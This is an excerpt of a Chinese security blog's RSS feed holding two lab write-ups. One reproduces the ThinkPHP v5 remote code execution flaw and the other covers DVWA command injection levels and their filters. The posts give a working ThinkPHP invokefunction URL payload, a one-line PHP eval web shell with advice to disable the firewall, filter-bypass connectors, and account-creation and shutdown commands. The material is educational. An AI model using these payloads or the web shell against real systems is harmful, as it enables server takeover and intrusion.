      <content:encoded><![CDATA[<p> 基于对RCE的学习，对著名的thinkphpv5进行漏洞复现</p><span id="more"></span><h2 id="搭建ThinkPHP-V5框架"><a href="#搭建ThinkPHP-V5框架" class="headerlink" title="搭建ThinkPHP V5框架"></a>搭建ThinkPHP V5框架</h2><p>首先搭建ThinkPHP V5框架，搭建过程可以参考<a href="https://blog.csdn.net/Jack_num1/article/details/105918659">thinkphp5环境搭建</a><br><img src="/2022/08/11/thinkphp5/11.png" style="zoom:50%;"><img src="/2022/08/11/thinkphp5/2.png" style="zoom:50%;"><br>在这个页面中可以看到并没有靶场给的那么明显的输入框，那么唯一的输入框就是ip地址的输入框</p><h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><p>进行注入尝试<br>输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php？s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;whoami<br>即在原地址后插入了从？s到whoami的命令。因为该框架是基于php语言构建所以可以执行linux命令<br>输出：<img src="/2022/08/11/thinkphp5/3.png" style="zoom:80%;"></p><h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><p>可以看到是存在命令执行漏洞的，尝试写入shell（后门木马）<br>输入：<img src="/2022/08/11/thinkphp5/4.png"><br>可以在thinkphpv5安装的地址中找到shell.php文件，推荐进行这步关闭防火墙，因为即便shell.php文件是空的，系统仍会警告然后删掉<br>输出：</p><img src="/2022/08/11/thinkphp5/5.png" style="zoom:67%;"><p><strong>注意:需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不<br>用引号(单引号、双引号),部分字符url编码不编码都行。</strong><br>shell.php文件内容为&lt;?php @eval($_POST[cmd];?)</p><h2 id="夺旗"><a href="#夺旗" class="headerlink" title="夺旗"></a>夺旗</h2><p>(1)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;<br>输出：<img src="/2022/08/11/thinkphp5/6.png" style="zoom:80%;"></p><p>(2)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;flag<br>输出：<img src="/2022/08/11/thinkphp5/7.png" style="zoom:80%;"></p><p>(3)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;cat &#x2F;flag<br>输出：<img src="/2022/08/11/thinkphp5/8.png" style="zoom:80%;"></p><h2 id="通过phpinfo函数查看phpinfo-信息"><a href="#通过phpinfo函数查看phpinfo-信息" class="headerlink" title="通过phpinfo函数查看phpinfo()信息"></a>通过phpinfo函数查看phpinfo()信息</h2><h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：<img src="/2022/08/11/thinkphp5/9.png"></h3><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：<img src="/2022/08/11/thinkphp5/10.png" style="zoom:80%;"></h3><hr><p>相关源码部分正在学习，之后补上，可别忘了</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/">网络攻防</category>
      
      <category domain="http://example.com/tags/PHP/">PHP</category>
      
      
      <comments>http://example.com/2022/08/11/thinkphp5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RCE</title>
      <link>http://example.com/2022/08/10/RCE/</link>
      <guid>http://example.com/2022/08/10/RCE/</guid>
      <pubDate>Wed, 10 Aug 2022 07:40:03 GMT</pubDate>
      
      <description>&lt;p&gt;通过dvwa靶场进行对RCE漏洞的学习和复现&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>通过dvwa靶场进行对RCE漏洞的学习和复现</p><span id="more"></span><h1 id="命令执行漏洞（RCE"><a href="#命令执行漏洞（RCE" class="headerlink" title="命令执行漏洞（RCE)"></a>命令执行漏洞（RCE)</h1><h2 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h2><img src="/2022/08/10/RCE/101.png" style="zoom:67%;"><h2 id="常用的cmd命令"><a href="#常用的cmd命令" class="headerlink" title="常用的cmd命令"></a>常用的cmd命令</h2><p>whoami——查看当前用户名<br>ipconfig——查看网卡信息<br>shutdown -s -t 0——关机————（-s：shutdown    -t 0 ：time 0立即关机）<br>net user [username] [password] &#x2F;add——增加一个用户名为username密码为password的新用户<img src="/2022/08/10/RCE/201.png"><br>type [file_name]——查看filename文件内容<br><img src="/2022/08/10/RCE/301.png" style="zoom:67%;"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="Command-Injection-防御-low"><a href="#Command-Injection-防御-low" class="headerlink" title="Command Injection 防御 low"></a>Command Injection 防御 low</h3><h4 id="注入点-代码"><a href="#注入点-代码" class="headerlink" title="注入点(代码)"></a>注入点(代码)</h4><p><img src="/2022/08/10/RCE/401.png"></p><h4 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h4><img src="/2022/08/10/RCE/501.png" style="zoom:67%;"><img src="/2022/08/10/RCE/601.png" style="zoom:67%;"><h3 id="Command-Injection-防御-low-1"><a href="#Command-Injection-防御-low-1" class="headerlink" title="Command Injection 防御 low"></a>Command Injection 防御 low</h3><p>防御命令执行的最高效的方法，就是过滤命令连接符<br>将| ；&amp; || &amp;&amp; 符号替换成空，或判断用户输入这些符号就终止执行</p><h4 id="Command-Injection-防御-medium"><a href="#Command-Injection-防御-medium" class="headerlink" title="Command Injection 防御 medium"></a>Command Injection 防御 medium</h4><p><img src="/2022/08/10/RCE/701.png"><br>str_replace(find,replace,string,count)：字符替换函数。find：规定要查找的值replace：规定替换find中的值string：被搜索的字符串  count：对替换数进行计数的变量<br>array_keys(array,value,strict):返回一个包含所有键名的一个新数组。array：规定数组value：指定健值（可选)strict：可能的值：true  false  是否依赖类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要替换的元素少于查到到的元素</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$find</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="variable">$replace</span> = <span class="keyword">array</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$find</span>,<span class="variable">$replace</span>,<span class="variable">$arr</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">运行结果</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; B [<span class="number">1</span>] =&gt; [<span class="number">2</span>] =&gt; ! )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">); </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_keys</span>(<span class="variable">$substitutions</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$substitutions</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; &amp;&amp; [<span class="number">1</span>] =&gt; ; ) <span class="title function_ invoke__">Array</span> ( [&amp;&amp;] =&gt; [;] =&gt; )</span><br></pre></td></tr></table></figure><h3 id="Command-Injection-攻击-medium"><a href="#Command-Injection-攻击-medium" class="headerlink" title="Command Injection 攻击 medium"></a>Command Injection 攻击 medium</h3><p>在medium防御中看到只过滤；和&amp;&amp;，所以使用其他三种即可。<br><img src="/2022/08/10/RCE/801.png" alt="image-20220805155321480" style="zoom:67%;"><br><img src="/2022/08/10/RCE/901.png" alt="image-20220805155720842" style="zoom:67%;"></p><h3 id="Command-Injection-防御-high"><a href="#Command-Injection-防御-high" class="headerlink" title="Command Injection 防御 high"></a>Command Injection 防御 high</h3><p><img src="/2022/08/10/RCE/1001.png"><br><strong>注意上面‘| ’拦截并非是|，而是|加空格</strong>————代码不规范导致的漏洞</p><h3 id="Command-Injection-攻击-high"><a href="#Command-Injection-攻击-high" class="headerlink" title="Command Injection 攻击 high"></a>Command Injection 攻击 high</h3><img src="/2022/08/10/RCE/1101.png" style="zoom:67%;"><h3 id="Command-Injection-防御-impossible"><a href="#Command-Injection-防御-impossible" class="headerlink" title="Command Injection 防御 impossible"></a>Command Injection 防御 impossible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];        <span class="comment">//将输入内容赋值给变量$target</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );      <span class="comment">//去除用户输入的\</span></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects </span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );       <span class="comment">//把用户输入的数据根据.分开</span></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer </span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) <span class="comment">//分别判断分成的四个部分是不是数字，并判断是不是四个数字</span></span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together. </span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>]; <span class="comment">//后端格式验证，用.拼接起来</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123; </span><br><span class="line">            <span class="comment">// Windows </span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125;                                                                   </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// *nix </span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/">网络攻防</category>
      
      <category domain="http://example.com/tags/RCE/">RCE</category>
      
      
      <comments>http://example.com/2022/08/10/RCE/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
